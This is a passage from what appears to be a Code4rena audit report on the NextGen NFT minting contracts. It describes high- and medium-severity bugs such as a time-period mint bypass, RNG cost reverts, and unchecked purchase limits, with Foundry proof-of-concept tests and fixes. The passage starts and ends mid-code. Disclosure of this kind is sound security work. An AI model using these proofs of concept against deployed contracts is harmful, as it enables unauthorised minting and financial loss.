            block.timestamp + 10 days, // _publicEndTime
            merkleRoot_msgSender
        );

        // jump to a time inside public minting window
        skip(1 days + 23 hours + 59 minutes + 55 seconds);
        vm.startPrank(anyone);

        // 2 tokens are mintable here, 1 from this period, and 1 from the previous unminted period
        hhMinter.mint{value: (1 ether)}(
            1, // collectionID
            1, // numberOfTokens
            0,
            '{"tdh": "100"}', // tokenData
            anyone, // mintTo
            new bytes32[](1),
            address(0),
            2 // varg0
        );
        assertEq(IERC721(address(hhCore)).ownerOf(10000000000), anyone);
        hhMinter.mint{value: (1.1 ether)}(
            1, // collectionID
            1, // numberOfTokens
            0,
            '{"tdh": "100"}', // tokenData
            anyone, // mintTo
            new bytes32[](1),
            address(0),
            2 // varg0
        );
        assertEq(IERC721(address(hhCore)).ownerOf(10000000001), anyone);
        // works as expected so far

        skip(6 seconds);
        // @audit-issue : should not have been able to mint, as it should have waited for 1 day before allowing so
        hhMinter.mint{value: (1.2 ether)}(
            1, // collectionID
            1, // numberOfTokens
            0,
            '{"tdh": "100"}', // tokenData
            anyone, // mintTo
            new bytes32[](1),
            address(0),
            2 // varg0
        );
        assertEq(IERC721(address(hhCore)).ownerOf(10000000002), anyone); // @audit-info : should not have been the owner
        vm.stopPrank();
    }
}
```

## Tools Used
Foundry.

## Recommended Mitigation Steps
This hasn't been tested thoroughly after the said change, but should be along the lines of (make similar changes at other places too):

```diff
File: smart-contracts/MinterContract.sol#L252

-   lastMintDate[col] = collectionPhases[col].allowlistStartTime + (collectionPhases[col].timePeriod * (gencore.viewCirSupply(col) - 1));
+   lastMintDate[col] = block.timestamp;
```

---

### <a id="h-13"></a>[H-13]
## **Protocol will never be able to mint if integrated with `RandomizerRNG` and has `RNGCost > 0`, due to incorrect implementation of `calculateTokenHash()`**
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L229
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerRNG.sol#L53-L57
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerRNG.sol#L40-L42
<br>

## Impact
`RandomizerRNG.sol` allows to call [updateRNGCost()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerRNG.sol#L73-L75) so that some amount can be charged whenever [requestRandomWords()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerRNG.sol#L40-L42) is called. This `requestRandomWords()` is called each time the function [calculateTokenHash()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerRNG.sol#L53-L57) is called by [_mintProcessing()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L229) which is a critical function called at every `mint()`, `burnToMint()`, `burn()`, etc.
However, neither the function `calculateTokenHash()` nor `_mintProcessing()` are marked as `payable` or pass on any `msg.value` to `requestRandomWords()`. Thus, if `ethRequired` is set to a value higher than 0 inside [updateRNGCost()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/RandomizerRNG.sol#L73-L75) the code will always revert, breaking critical functionlities across the protocol.

## Proof of Concept
- Install foundry and run `forge init --no-git --force` from root folder (`2023-10-nextgen/`).
- Paste the following code inside a new file `2023-10-nextgen/test/t0x1cRNG.t.sol`.
- Run via `forge test --mt test_t0x1cRNG -vv`

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {DelegationManagementContract} from "../smart-contracts/NFTdelegation.sol";
import {randomPool} from "../smart-contracts/XRandoms.sol";
import {NextGenAdmins} from "../smart-contracts/NextGenAdmins.sol";
import {NextGenCore} from "../smart-contracts/NextGenCore.sol";
import {NextGenRandomizerRNG} from "../smart-contracts/RandomizerRNG.sol";
import {NextGenMinterContract} from "../smart-contracts/MinterContract.sol";

interface IERC721 {
    function ownerOf(uint256 tokenId) external view returns (address owner);
}

contract t0x1cRNG is Test {
    address public addr1;
    address public anyone;
    bytes32 public merkleRoot_msgSender;
    bytes32[] public _merkleProof_msgSender;
    string[] public _collectionScript;

    DelegationManagementContract hhDelegation;
    randomPool hhRandoms;
    NextGenAdmins hhAdmin;
    NextGenCore hhCore;
    NextGenRandomizerRNG hhRandomizer;
    NextGenMinterContract hhMinter;

    function setUp() public {
        addr1 = makeAddr("addr1");
        anyone = makeAddr("anyone");
        merkleRoot_msgSender = 0x208fae20dc5074374a223a1a825bfc23fbf2c9c88f5b092fa3421d54058170d3;

        hhDelegation = new DelegationManagementContract();
        hhAdmin = new NextGenAdmins();
        hhCore = new NextGenCore("Next Gen Core", "NEXTGEN", address(hhAdmin));

        // This example uses RandomizerRNG
        hhRandomizer = new NextGenRandomizerRNG( address(hhCore), address(hhAdmin), address(0)); // @audit-info : it's ok to use address(0) here as the PoC is supposed to show failure before the point this address is required

        hhMinter = new NextGenMinterContract(address(hhCore), address(hhDelegation), address(hhAdmin));

        checkIfContractsAreDeployed();

        _collectionScript = new string[](1);
        _collectionScript[0] = "desc";

        vm.deal(anyone, 100 ether);
        vm.deal(address(hhCore), 100 ether);
    }

    function checkIfContractsAreDeployed() public {
        assertNotEq(address(hhAdmin), address(0));
        assertNotEq(address(hhCore), address(0));
        assertNotEq(address(hhDelegation), address(0));
        assertNotEq(address(hhMinter), address(0));
        assertNotEq(address(hhRandomizer), address(0));
    }

    function test_t0x1cRNG() public {
        /// create collection
        hhCore.createCollection(
            "Test Collection 1",
            "Artist 1",
            "For testing",
            "www.test.com",
            "CCO",
            "https://ipfs.io/ipfs/hash/",
            "",
            _collectionScript
        );

        /// register collection admin
        hhAdmin.registerCollectionAdmin(1, addr1, true);

        /// set collection data
        vm.prank(addr1);
        hhCore.setCollectionData(
            1, // collectionID
            addr1, // collectionArtistAddress
            3, // maxCollectionPurchases
            3, // collectionTotalSupply
            1_000 // setFinalSupplyTimeAfterMint
        );

        /// set minter contract
        hhCore.addMinterContract(address(hhMinter));

        /// set randomizer contract & update cost
        hhCore.addRandomizer(1, address(hhRandomizer));
        hhRandomizer.updateRNGCost(1 ether); // @audit-info : setting cost to any value greater than 0

        hhMinter.setCollectionCosts(
            1, // collectionID
            1 ether, // collectionMintCost
            0, // collectionEndMintCost
            10, // rate
            1 days, // timePeriod
            3, // salesOption
            address(0)
        );

        vm.warp(block.timestamp + 1 days);
        hhMinter.setCollectionPhases(
            1, // collectionID
            block.timestamp, // _allowlistStartTime
            block.timestamp, // _allowlistEndTime
            block.timestamp + 1 days, // _publicStartTime
            block.timestamp + 10 days, // _publicEndTime
            merkleRoot_msgSender
        );

        skip(1 days);
        vm.prank(anyone);
        // @audit-issue : will fail
        hhMinter.mint{value: (1 ether)}(
            1, // collectionID
            1, // numberOfTokens
            0,
            '{"tdh": "100"}', // tokenData
            anyone, // mintTo
            new bytes32[](1),
            address(0),
            2 // varg0
        );
    }
}
```

The above test will always fail with `EvmError: OutOfFund` when internally the call reaches `requestRandomWords()`.

## Tools Used
Foundry.

## Recommended Mitigation Steps
Mark the necessary functions as payable.

<br><br>

## **MEDIUM-SEVERITY BUGS**
---

### <a id="m-01"></a>[M-01]
## **Excess ether never returned to the user and is taken by the artist & the protocol**
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L233
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L266
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L361
<br>

## Impact
Throughout the `MinterContract.sol`, for functions like [mint()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L233), user can pay more than required Ether but there is no provision for him to get back that excess Ether. This additional Ether is simply added to the `collectionTotalAmount[col]` and later distributed as royalties.

## Proof of Concept
https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L233 <br>
https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L266 <br>
https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L361 <br>

## Tools Used
Manual inspection.

## Recommended Mitigation Steps
Return excess Ether to the user, or make changes to enforce strict equality (`==` instead of `>=`). 

---

### <a id="m-02"></a>[M-02]
## **Phase2 minter can not mint if timeline overlaps with Phase1**
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L202
<br>

## Impact
`hhMinter` can `setCollectionPhases` like so:
```js
        hhMinter.setCollectionPhases(
            1, // collectionID
            block.timestamp, // _allowlistStartTime
            block.timestamp + 1 days, // _allowlistEndTime
            block.timestamp + 1 days, // _publicStartTime // @audit-issue : should be greater than "block.timestamp + 1 days"; overlap causes issues
            block.timestamp + 2 days, // _publicEndTime
            merkleRoot
        );
```

Since the `_publicStartTime` in the above example overlaps with `_allowlistEndTime`, public minting is not possible at timestamp of `block.timestamp + 1 days` and will revert with error `invalid proof`. It is possible only from timestamp `block.timestamp + 1 days + 1`. PoC provided below. 
Note that having such overlap is [even recommended by the protocol itself](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L543). If this is done in `salesOption = 2` as recommended by the developer's comment, then public minting won't be possible till `allowList`-phase is on. **This means that the protocol will never see a token minted at `collectionMintCost`, the highest price it could have received, in case of an Exponential/Linear descending sale**. 
<br><br>

_Additional Note:_ Since the protocol seems to allow overlap timelines of Phase1 and Phase2, this would be even more problematic if `hhMinter` configures something like this:
```js
        hhMinter.setCollectionPhases(
            1, // collectionID
            block.timestamp, // _allowlistStartTime
            block.timestamp + 2 days, // _allowlistEndTime
            block.timestamp + 1 days, // _publicStartTime 
            block.timestamp + 2 days, // _publicEndTime
            merkleRoot
        );
```
Since the `maxAllowance` of `allowList` in Phase1 and that of general(public) users in Phase2 are decided separately (one by setting the merkle root while the other by setting `maxCollectionPurchases` via `setCollectionData()`), the above configuration would be fine in principle with no downside to `allowList` users. However, in this config, general users will never be able to mint a token at all as Phase2 time period is completely within Phase1 time period.

## Proof of Concept
- Install foundry and run `forge init --no-git --force` from root folder (`2023-10-nextgen/`).
- Paste the following code inside a new file `2023-10-nextgen/test/t0x1cPhasesOverlap.t.sol`.
- Run via `forge test --mt test_t0x1cPhasesOverlap -vv`

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {DelegationManagementContract} from "../smart-contracts/NFTdelegation.sol";
import {randomPool} from "../smart-contracts/XRandoms.sol";
import {NextGenAdmins} from "../smart-contracts/NextGenAdmins.sol";
import {NextGenCore} from "../smart-contracts/NextGenCore.sol";
import {NextGenRandomizerNXT} from "../smart-contracts/RandomizerNXT.sol";
import {NextGenMinterContract} from "../smart-contracts/MinterContract.sol";

contract t0x1cPhasesOverlap is Test {
    address public anyone;
    address public addr1;
    bytes32 public merkleRoot;
    bytes32 public merkleRoot_msgSender;
    bytes32[] public _merkleProof_msgSender;
    string[] public _collectionScript;

    DelegationManagementContract hhDelegation;
    randomPool hhRandoms;
    NextGenAdmins hhAdmin;
    NextGenCore hhCore;
    NextGenRandomizerNXT hhRandomizer;
    NextGenMinterContract hhMinter;

    function setUp() public {
        anyone = makeAddr("anyone");
        addr1 = makeAddr("addr1");
        merkleRoot_msgSender = 0x208fae20dc5074374a223a1a825bfc23fbf2c9c88f5b092fa3421d54058170d3; // gives max allowance of 19 tokens in phase1
        _merkleProof_msgSender = new bytes32[](1);
        _merkleProof_msgSender[0] = 0x9200f00000000000000000000000000000000000000000000000000000000001;

        hhDelegation = new DelegationManagementContract();
        hhRandoms = new randomPool();
        hhAdmin = new NextGenAdmins();
        hhCore = new NextGenCore("Next Gen Core", "NEXTGEN", address(hhAdmin));

        // This example uses the NXT Randomizer
        hhRandomizer = new NextGenRandomizerNXT(address(hhRandoms), address(hhAdmin), address(hhCore));

        hhMinter = new NextGenMinterContract(address(hhCore), address(hhDelegation), address(hhAdmin));

        checkIfContractsAreDeployed();

        _collectionScript = new string[](1);
        _collectionScript[0] = "desc";

        vm.deal(anyone, 100 ether);
        vm.deal(addr1, 100 ether);
    }

    function checkIfContractsAreDeployed() public {
        assertNotEq(address(hhAdmin), address(0));
        assertNotEq(address(hhCore), address(0));
        assertNotEq(address(hhDelegation), address(0));
        assertNotEq(address(hhMinter), address(0));
        assertNotEq(address(hhRandomizer), address(0));
        assertNotEq(address(hhRandoms), address(0));
    }

    function test_t0x1cPhasesOverlap() public {
        /// create collection
        hhCore.createCollection(
            "Test Collection 1",
            "Artist 1",
            "For testing",
            "www.test.com",
            "CCO",
            "https://ipfs.io/ipfs/hash/",
            "",
            _collectionScript
        );

        /// register collection admin
        hhAdmin.registerCollectionAdmin(1, addr1, true);

        /// set collection data
        vm.prank(addr1);
        hhCore.setCollectionData(
            1, // collectionID
            addr1, // collectionArtistAddress
            1, // maxCollectionPurchases
            100, // collectionTotalSupply
            1_000 // setFinalSupplyTimeAfterMint
        );

        /// set minter contract
        hhCore.addMinterContract(address(hhMinter));

        /// set randomizer contracts
        hhCore.addRandomizer(1, address(hhRandomizer));

        hhMinter.setCollectionCosts(
            1, // collectionID
            1 ether, // collectionMintCost
            0, // collectionEndMintCost -- does not matter for salesOption 1
            0, // rate -- does not matter for salesOption 1
            0, // timePeriod -- does not matter for salesOption 1
            1, // salesOption
            address(0)
        );

        /// specify the correct merkle root
        merkleRoot = merkleRoot_msgSender;

        hhMinter.setCollectionPhases(
            1, // collectionID
            block.timestamp, // _allowlistStartTime
            block.timestamp + 1 days, // _allowlistEndTime
            block.timestamp + 1 days, // _publicStartTime // @audit-issue : should be greater than "block.timestamp + 1 days"; overlap causes issues
            block.timestamp + 2 days, // _publicEndTime
            merkleRoot
        );

        /// minting
        vm.warp(block.timestamp + 1 days); // still within the `allowList` time-window, hence phase1 minting can happen
        vm.prank(addr1);
        hhMinter.mint{value: 10 ether}(
            1, // collectionID
            10, // numberOfTokens
            19, // maxAllowance -- has to exactly match merkle root's value
            '{"tdh": "100"}', // tokenData
            addr1, // mintTo
            _merkleProof_msgSender,
            address(0), // no delegator, self-mint
            2 // varg0
        );

        // try public minting now
        vm.prank(anyone);
        vm.expectRevert("invalid proof"); // phase2 minter not able to mint
        hhMinter.mint{value: (1 ether)}(
            1, // collectionID
            1, // numberOfTokens
            1, // maxAllowance
            '{"tdh": "100"}', // tokenData
            anyone, // mintTo
            new bytes32[](1), // no merkle proof required for public minting
            address(0), // no delegator, self-mint
            2 // varg0
        );

        skip(1); // will work now since we moved forward by an "additional" 1 second
        vm.prank(anyone);
        hhMinter.mint{value: (1 ether)}(
            1, // collectionID
            1, // numberOfTokens
            1, // maxAllowance
            '{"tdh": "100"}', // tokenData
            anyone, // mintTo
            new bytes32[](1), // no merkle proof required for public minting
            address(0), // no delegator, self-mint
            2 // varg0
        );
    }
}
```

## Tools Used
Foundry.

## Recommended Mitigation Steps
- Do not allow `hhMinter` to set overlapping timelines, OR
- Rework the if-else conditions inside [mint()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L202) function to handle such overlaps.

---

### <a id="m-03"></a>[M-03]
## **`allowList` user can't claim his unused allowance quota once Phase2 starts**
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L221
<br>

## Impact
- The max-allowance or quota of tokens `allowList` users can mint in Phase1 is decided by the merkle root. Let's call this "_preferentialAllowance_".
- The above is completely independent from the max-allowance of public users in Phase2 which is configured by setting `maxCollectionPurchases` via [setCollectionData()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L151). Let's call this "_publicAllowance_".
- `allowList` users can preferentially mint their tokens first during Phase1, by providing the correct merkle proof to [mint()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L202-L220). However, in case they do not utilize their complete _preferentialAllowance_, they should be able to continue doing so in Phase2 alongside the public users (of course with no preferential treatment and while competing with public users).
<br>

The issue is that currently the protocol stops `allowList` users from minting tokens from their unused _preferentialAllowance_. In Phase2, they too are being limited by the _publicAllowance_ and any unused _preferentialAllowance_ from Phase1 is essentially "expired".

## Proof of Concept
- Install foundry and run `forge init --no-git --force` from root folder (`2023-10-nextgen/`).
- Paste the following code inside a new file `2023-10-nextgen/test/t0x1cPhase1Allowance.t.sol`.
- Run via `forge test --mt test_t0x1cPhase1Allowance -vv`

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {DelegationManagementContract} from "../smart-contracts/NFTdelegation.sol";
import {randomPool} from "../smart-contracts/XRandoms.sol";
import {NextGenAdmins} from "../smart-contracts/NextGenAdmins.sol";
import {NextGenCore} from "../smart-contracts/NextGenCore.sol";
import {NextGenRandomizerNXT} from "../smart-contracts/RandomizerNXT.sol";
import {NextGenMinterContract} from "../smart-contracts/MinterContract.sol";

contract t0x1cPhase1Allowance is Test {
    address public anyone;
    address public addr1;
    bytes32 public merkleRoot;
    bytes32 public merkleRoot_msgSender;
    bytes32[] public _merkleProof_msgSender;
    string[] public _collectionScript;

    DelegationManagementContract hhDelegation;
    randomPool hhRandoms;
    NextGenAdmins hhAdmin;
    NextGenCore hhCore;
    NextGenRandomizerNXT hhRandomizer;
    NextGenMinterContract hhMinter;

    function setUp() public {
        anyone = makeAddr("anyone");
        addr1 = makeAddr("addr1");
        merkleRoot_msgSender = 0x208fae20dc5074374a223a1a825bfc23fbf2c9c88f5b092fa3421d54058170d3; // @audit-info : gives max-allowance of 19 tokens in phase1 ("preferentialAllowance" = 19)
        _merkleProof_msgSender = new bytes32[](1);
        _merkleProof_msgSender[0] = 0x9200f00000000000000000000000000000000000000000000000000000000001;

        hhDelegation = new DelegationManagementContract();
        hhRandoms = new randomPool();
        hhAdmin = new NextGenAdmins();
        hhCore = new NextGenCore("Next Gen Core", "NEXTGEN", address(hhAdmin));

        // This example uses the NXT Randomizer
        hhRandomizer = new NextGenRandomizerNXT(address(hhRandoms), address(hhAdmin), address(hhCore));

        hhMinter = new NextGenMinterContract(address(hhCore), address(hhDelegation), address(hhAdmin));

        checkIfContractsAreDeployed();

        _collectionScript = new string[](1);
        _collectionScript[0] = "desc";

        vm.deal(anyone, 100 ether);
        vm.deal(addr1, 100 ether);
    }

    function checkIfContractsAreDeployed() public {
        assertNotEq(address(hhAdmin), address(0));
        assertNotEq(address(hhCore), address(0));
        assertNotEq(address(hhDelegation), address(0));
        assertNotEq(address(hhMinter), address(0));
        assertNotEq(address(hhRandomizer), address(0));
        assertNotEq(address(hhRandoms), address(0));
    }

    function test_t0x1cPhase1Allowance() public {
        /// create collection
        hhCore.createCollection(
            "Test Collection 1",
            "Artist 1",
            "For testing",
            "www.test.com",
            "CCO",
            "https://ipfs.io/ipfs/hash/",
            "",
            _collectionScript
        );

        /// register collection admin
        hhAdmin.registerCollectionAdmin(1, addr1, true);

        /// set collection data
        vm.prank(addr1);
        hhCore.setCollectionData(
            1, // collectionID
            addr1, // collectionArtistAddress
            1, // maxCollectionPurchases // @audit-info : "publicAllowance" of 1
            100, // collectionTotalSupply
            1_000 // setFinalSupplyTimeAfterMint
        );

        /// set minter contract
        hhCore.addMinterContract(address(hhMinter));

        /// set randomizer contracts
        hhCore.addRandomizer(1, address(hhRandomizer));

        hhMinter.setCollectionCosts(
            1, // collectionID
            1 ether, // collectionMintCost
            0, // collectionEndMintCost -- does not matter for salesOption 1
            0, // rate -- does not matter for salesOption 1
            0, // timePeriod -- does not matter for salesOption 1
            1, // salesOption
            address(0)
        );

        /// specify the correct merkle root
        merkleRoot = merkleRoot_msgSender;

        hhMinter.setCollectionPhases(
            1, // collectionID
            block.timestamp, // _allowlistStartTime
            block.timestamp + 1 days, // _allowlistEndTime
            block.timestamp + 1 days + 1, // _publicStartTime
            block.timestamp + 2 days, // _publicEndTime
            merkleRoot
        );

        /// minting
        vm.warp(block.timestamp + 1 days); // within the `allowList` time-window, hence Phase1 minting can happen
        vm.prank(addr1);
        hhMinter.mint{value: 10 ether}(
            1, // collectionID
            10, // numberOfTokens // @audit-info : mint 10 out of 19 "preferentialAllowance" tokens
            19, // maxAllowance -- has to exactly match merkle root's value
            '{"tdh": "100"}', // tokenData
            addr1, // mintTo
            _merkleProof_msgSender,
            address(0), // no delegator, self-mint
            2 // varg0
        );

        skip(1); // move to public minting Phase2
        // @audit-info : won't be allowed since `numberOfTokens` > "publicAllowance" even though `numberOfTokens` <= unused "preferentialAllowance"
        vm.prank(addr1);
        vm.expectRevert("Change no of tokens");
        hhMinter.mint{value: (5 ether)}(
            1, // collectionID
            5, // numberOfTokens
            1, // maxAllowance
            '{"tdh": "100"}', // tokenData
            addr1, // mintTo
            new bytes32[](1), // no merkle proof required for public minting
            address(0), // no delegator, self-mint
            2 // varg0
        );

        // @audit-info : will be allowed since `numberOfTokens` <= "publicAllowance"
        vm.prank(addr1);
        hhMinter.mint{value: (1 ether)}(
            1, // collectionID
            1, // numberOfTokens
            1, // maxAllowance
            '{"tdh": "100"}', // tokenData
            addr1, // mintTo
            new bytes32[](1), // no merkle proof required for public minting
            address(0), // no delegator, self-mint
            2 // varg0
        );
    }
}
```

## Tools Used
Foundry.

## Recommended Mitigation Steps
Modify the logic inside [mint()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L202) function to let `allowList` users mint unclaimed _preferentialAllowance_ even in Phase2.


---

### <a id="m-04"></a>[M-04]
## **For small value of `royalties`, dust amount is left behind which should be paid out**
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L429-L433
<br>

## Impact
If value of `royalties` (`collectionTotalAmount[_collectionID]`) is small, a dust amount is leftover in the contract. In such cases, this royalty amount should be paid to either the artist or any another address decided by the protocol.

## Proof of Concept
Imagine the following case:

```js
collectionTotalAmount[_collectionID] = 50

add1Percentage = 25
add2Percentage = 25
add3Percentage = 25

_teamperc1 = 25
_teamperc2 = 0

Then, 
artistRoyalties1 = 50 * 25 / 100 = 12
artistRoyalties2 = 50 * 25 / 100 = 12
artistRoyalties3 = 50 * 25 / 100 = 12

teamRoyalties1 = 50 * 25 / 100 = 12
teamRoyalties2 = 50 * 0 / 100 = 0
```

Total royalty paid out = 12 + 12 + 12 + 12 + 0 = `48` . Thus, `50 - 48 = 2 wei` is still left as dust amount. This should be paid out too. This also helps in protecting the artist from zero payment for cases like `collectionTotalAmount[_collectionID] = 3`. 

## Tools Used
Manual inspection.

## Recommended Mitigation Steps
The following lines can be added:

```diff
File: smart-contracts/MinterContract.sol#L415

    function payArtist(uint256 _collectionID, address _team1, address _team2, uint256 _teamperc1, uint256 _teamperc2) public FunctionAdminRequired(this.payArtist.selector) {
        require(collectionArtistPrimaryAddresses[_collectionID].status == true, "Accept Royalties");
        require(collectionTotalAmount[_collectionID] > 0, "Collection Balance must be grater than 0");
        require(collectionRoyaltiesPrimarySplits[_collectionID].artistPercentage + _teamperc1 + _teamperc2 == 100, "Change percentages");
        uint256 royalties = collectionTotalAmount[_collectionID];
        collectionTotalAmount[_collectionID] = 0;
        address tm1 = _team1;
        address tm2 = _team2;
        uint256 colId = _collectionID;
        uint256 artistRoyalties1;
        uint256 artistRoyalties2;
        uint256 artistRoyalties3;
        uint256 teamRoyalties1;
        uint256 teamRoyalties2;
        artistRoyalties1 = royalties * collectionArtistPrimaryAddresses[colId].add1Percentage / 100;
        artistRoyalties2 = royalties * collectionArtistPrimaryAddresses[colId].add2Percentage / 100;
        artistRoyalties3 = royalties * collectionArtistPrimaryAddresses[colId].add3Percentage / 100;
        teamRoyalties1 = royalties * _teamperc1 / 100;
        teamRoyalties2 = royalties * _teamperc2 / 100;
+       uint256 _dust = royalties - artistRoyalties1 - artistRoyalties2 - artistRoyalties3 - teamRoyalties1 - teamRoyalties2;
+       artistRoyalties1 = artistRoyalties1 + _dust;  // @audit-info : in this case, we are deciding to pay the artist this dust amount, but protocol could decide differently
        (bool success1, ) = payable(collectionArtistPrimaryAddresses[colId].primaryAdd1).call{value: artistRoyalties1}("");
        (bool success2, ) = payable(collectionArtistPrimaryAddresses[colId].primaryAdd2).call{value: artistRoyalties2}("");
        (bool success3, ) = payable(collectionArtistPrimaryAddresses[colId].primaryAdd3).call{value: artistRoyalties3}("");
        (bool success4, ) = payable(tm1).call{value: teamRoyalties1}("");
        (bool success5, ) = payable(tm2).call{value: teamRoyalties2}("");
        emit PayArtist(collectionArtistPrimaryAddresses[colId].primaryAdd1, success1, artistRoyalties1);
        emit PayArtist(collectionArtistPrimaryAddresses[colId].primaryAdd2, success2, artistRoyalties2);
        emit PayArtist(collectionArtistPrimaryAddresses[colId].primaryAdd3, success3, artistRoyalties3);
        emit PayTeam(tm1, success4, teamRoyalties1);
        emit PayTeam(tm2, success5, teamRoyalties2);
    }
```

---

### <a id="m-05"></a>[M-05]
## **`maxCollectionPurchases` constraint set via `setCollectionData()` is not respected by `mintAndAuction()`**
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L276-L298
<br>

## Impact
Even after `maxCollectionPurchases` is set via [setCollectionData()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L147), this is not checked by [mintAndAuction()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L276-L298) and a given address can mint more than its allowance. 

## Proof of Concept
- Install foundry and run `forge init --no-git --force` from root folder (`2023-10-nextgen/`).
- Paste the following code inside a new file `2023-10-nextgen/test/t0x1cMintMaxCollection.t.sol`.
- Run via `forge test --mt test_t0x1cMintMaxCollection -vv`

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {DelegationManagementContract} from "../smart-contracts/NFTdelegation.sol";
import {randomPool} from "../smart-contracts/XRandoms.sol";
import {NextGenAdmins} from "../smart-contracts/NextGenAdmins.sol";
import {NextGenCore} from "../smart-contracts/NextGenCore.sol";
import {NextGenRandomizerNXT} from "../smart-contracts/RandomizerNXT.sol";
import {NextGenMinterContract} from "../smart-contracts/MinterContract.sol";
import {auctionDemo} from "../smart-contracts/AuctionDemo.sol";

interface IERC721 {
    function ownerOf(uint256 tokenId) external view returns (address owner);
    function approve(address to, uint256 tokenId) external;
}

contract t0x1cMintMaxCollection is Test {
    address public trustedAccount;
    address public bidder;
    bytes32 public merkleRoot_msgSender;
    string[] public _collectionScript;

    DelegationManagementContract hhDelegation;
    randomPool hhRandoms;
    NextGenAdmins hhAdmin;
    NextGenCore hhCore;
    NextGenRandomizerNXT hhRandomizer;
    NextGenMinterContract hhMinter;
    auctionDemo hhAuctionDemo;

    function setUp() public {
        trustedAccount = makeAddr("trustedAccount");
        bidder = makeAddr("bidder");
        merkleRoot_msgSender = 0x208fae20dc5074374a223a1a825bfc23fbf2c9c88f5b092fa3421d54058170d3; // gives max allowance of 19 tokens in phase1

        hhDelegation = new DelegationManagementContract();
        hhRandoms = new randomPool();
        hhAdmin = new NextGenAdmins();
        hhCore = new NextGenCore("Next Gen Core", "NEXTGEN", address(hhAdmin));

        // This example uses the NXT Randomizer
        hhRandomizer = new NextGenRandomizerNXT(address(hhRandoms), address(hhAdmin), address(hhCore));

        hhMinter = new NextGenMinterContract(address(hhCore), address(hhDelegation), address(hhAdmin));
        hhAuctionDemo = new auctionDemo(address(hhMinter), address(hhCore), address(hhAdmin));

        checkIfContractsAreDeployed();

        _collectionScript = new string[](1);
        _collectionScript[0] = "desc";

        vm.deal(trustedAccount, 100 ether);
        vm.deal(bidder, 100 ether);
    }

    function checkIfContractsAreDeployed() public {
        assertNotEq(address(hhAdmin), address(0));
        assertNotEq(address(hhCore), address(0));
        assertNotEq(address(hhDelegation), address(0));
        assertNotEq(address(hhMinter), address(0));
        assertNotEq(address(hhRandomizer), address(0));
        assertNotEq(address(hhRandoms), address(0));
        assertNotEq(address(hhAuctionDemo), address(0));
    }

    function test_t0x1cMintMaxCollection() public {
        /// create collection
        hhCore.createCollection(
            "Test Collection 1",
            "Artist 1",
            "For testing",
            "www.test.com",
            "CCO",
            "https://ipfs.io/ipfs/hash/",
            "",
            _collectionScript
        );

        /// register collection admin
        hhAdmin.registerCollectionAdmin(1, trustedAccount, true);

        /// set collection data
        vm.prank(trustedAccount);
        hhCore.setCollectionData(
            1, // collectionID
            trustedAccount, // collectionArtistAddress
            1, // maxCollectionPurchases // @audit-issue : not respected by mintAndAuction()
            100, // collectionTotalSupply
            1_000 // setFinalSupplyTimeAfterMint
        );

        /// set minter contract
        hhCore.addMinterContract(address(hhMinter));

        /// set randomizer contracts
        hhCore.addRandomizer(1, address(hhRandomizer));

        hhMinter.setCollectionCosts(
            1, // collectionID
            0, // collectionMintCost
            0, // collectionEndMintCost
            0, // rate
            2 days, // timePeriod
            0, // salesOption
            address(0)
        );

        uint256 blockTS = block.timestamp;
        hhMinter.setCollectionPhases(
            1, // collectionID
            blockTS + 2 days, // _allowlistStartTime
            blockTS + 4 days, // _allowlistEndTime
            blockTS + 100 days, // _publicStartTime
            blockTS + 101 days, // _publicEndTime
            merkleRoot_msgSender
        );

        vm.warp(blockTS + 2 days);
        hhMinter.mintAndAuction(
            trustedAccount,
            '{"tdh": "100"}',
            99,
            1,
            blockTS + 3 days // auction end time
        );
        vm.prank(trustedAccount);
        IERC721(address(hhCore)).approve(address(hhAuctionDemo), 10000000000);

        vm.prank(bidder);
        hhAuctionDemo.participateToAuction{value: 10 ether}(10000000000);

        assertEq(hhAuctionDemo.returnHighestBid(10000000000), 10 ether);
        assertEq(hhAuctionDemo.returnHighestBidder(10000000000), bidder);

        vm.warp(blockTS + 4 days);
        hhMinter.mintAndAuction(
            trustedAccount,
            '{"tdh": "100"}',
            99,
            1,
